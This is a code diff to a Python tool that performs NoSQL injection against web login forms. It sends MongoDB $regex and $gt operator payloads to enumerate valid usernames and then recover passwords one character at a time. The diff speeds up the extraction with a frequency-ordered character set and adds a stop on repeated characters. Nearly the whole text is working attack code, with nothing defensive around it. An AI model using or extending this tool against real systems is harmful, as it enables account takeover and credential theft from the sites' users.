@@ -16,8 +16,15 @@ CYAN   = Fore.CYAN
 BOLD   = Style.BRIGHT
 RESET  = Style.RESET_ALL
 
-# Characters to test during extraction
-CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
+# Smart charset — frequency order for faster extraction
+CHARSET = (
+    "aeiou" +                  # vowels first — most common
+    "rstlnm" +                 # most common consonants
+    string.digits +            # numbers
+    "bcdfghjkpqvwxyz" +       # remaining consonants
+    string.ascii_uppercase +   # uppercase
+    "@!#$%^&*_+-="            # special chars last
+)
 
 class Extractor:
     def __init__(self, url, username_field="username",
@@ -55,7 +62,6 @@ class Extractor:
             return None
 
     def _is_success(self, resp):
-        """Detect successful response"""
         success_keywords = [
             "welcome", "dashboard", "logout", "token",
             "success", "admin", "home", "profile",
@@ -74,10 +80,6 @@ class Extractor:
         return False
 
     def enumerate_users(self, known_users=None):
-        """
-        Enumerate valid usernames using $regex operator
-        Tests common usernames + any provided list
-        """
         print(f"\n{CYAN}{BOLD}[*] Enumerating usernames...{RESET}\n")
 
         common_users = [
@@ -96,11 +98,9 @@ class Extractor:
                 self.username_field: {"$regex": f"^{username}$", "$options": "i"},
                 self.password_field: {"$gt": ""}
             }
-
             resp = self._send(payload)
             if resp is None:
                 continue
-
             if self._is_success(resp):
                 found_users.append(username)
                 print(f"  {GREEN}{BOLD}[FOUND USER] {username}{RESET}")
@@ -112,10 +112,6 @@ class Extractor:
         return found_users
 
     def extract_password(self, username):
-        """
-        Extract password character by character using $regex
-        Works by testing each character position
-        """
         print(f"\n{CYAN}{BOLD}[*] Extracting password for: {username}{RESET}\n")
 
         password = ""
@@ -125,9 +121,7 @@ class Extractor:
             found_char = False
 
             for char in CHARSET:
-                # Test if password starts with known + current char
                 test_password = password + char
-
                 payload = {
                     self.username_field: username,
                     self.password_field: {
@@ -135,11 +129,9 @@ class Extractor:
                         "$options": ""
                     }
                 }
-
                 resp = self._send(payload)
                 if resp is None:
                     continue
-
                 if self._is_success(resp):
                     password += char
                     found_char = True
@@ -147,7 +139,13 @@ class Extractor:
                     break
 
             if not found_char:
-                # No more characters — password complete
+                break
+
+            # Stop false positive loop — same char repeats twice
+            if len(password) >= 2 and len(set(password[-2:])) == 1:
+                print(f"  {YELLOW}[!] Repeat character detected — stopping extraction{RESET}")
+                last_char = password[-1]
+                password = password.rstrip(last_char)
                 break
 
         if password:
@@ -161,17 +159,13 @@ class Extractor:
         return password
 
     def run(self, usernames=None):
-        """Full extraction run"""
         print(f"\n{CYAN}{BOLD}[*] Starting data extraction on: {self.url}{RESET}")
-
-        # Step 1 — enumerate users
         found_users = self.enumerate_users(usernames)
 
         if not found_users:
-            print(f"{YELLOW}[!] No users found. Try providing usernames with --usernames{RESET}")
+            print(f"{YELLOW}[!] No users found. Try --usernames to specify targets{RESET}")
             return self.extracted
 
-        # Step 2 — extract passwords for each user
         for user in found_users:
             self.extract_password(user)
 
